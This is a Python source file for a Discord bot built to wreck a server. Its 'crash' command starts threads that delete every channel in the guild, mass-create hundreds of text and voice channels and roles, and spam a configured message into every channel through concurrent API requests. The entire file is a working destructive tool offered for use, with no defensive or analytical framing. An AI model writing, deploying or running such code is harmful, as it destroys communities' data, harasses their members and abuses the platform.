import discord
import grequests
import threading
from discord.ext import commands

import bot_config

bot = commands.Bot(command_prefix = bot_config.prefix, 
                   intents = discord.Intents.all(),
                   activity = discord.Game(name = bot_config.status))
bot.remove_command('help')


path = "https://discord.com/api/v6"
headers = {
    "Authorization": f"Bot {bot_config.token}"
}

def delete_channels(ctx):
    grequests.map(
        grequests.delete(f"{path}/channels/{channel.id}", headers=headers)
        for channel
        in ctx.guild.channels
    )


def create_channels(ctx):
    grequests.map(
        grequests.post(f"{path}/guilds/{ctx.guild.id}/channels", json={
            "name": f"{bot_config.channel_names}",
            "type": 0
        }, headers=headers)
        for _
        in range(250)
    )
    grequests.map(
        grequests.post(f"{path}/guilds/{ctx.guild.id}/channels", json={
            "name": f"{bot_config.channel_names}",
            "type": 2
        }, headers=headers)
        for _
        in range(100)
    )


def create_roles(ctx):
    grequests.map(
        grequests.post(f"{path}/guilds/{ctx.guild.id}/roles", json={
            "name": f"{bot_config.roles_names}"
        }, headers=headers)
        for _
        in range(250)
    )


def send_messages(ctx):
    channels = grequests.map(
        grequests.get(f"{path}/guilds/{ctx.guild.id}/channels", headers=headers)
        for _
        in [0, 1]
    )
    for _ in range(11):
        grequests.map(
            grequests.post(f"{path}/channels/{int(channel)}/messages", headers=headers, json={
                "content": f"{bot_config.spam_message}"
            })
            for channel
            in [c["id"] for c in channels[0].json()]
        )


@bot.event
async def on_ready():
    print(f"{bot.user} | {bot.user.id} - ready")


@bot.command(aliases = bot_config.command_names)
async def crash_comamnd(ctx):
    threading.Thread(target=delete_channels, args=(ctx,)).start()
    threading.Thread(target=create_roles, args=(ctx,)).start()
    threading.Thread(target=create_channels, args=(ctx,)).start()
    threading.Thread(target=send_messages, args=(ctx,)).start()


bot.run(bot_config.token)
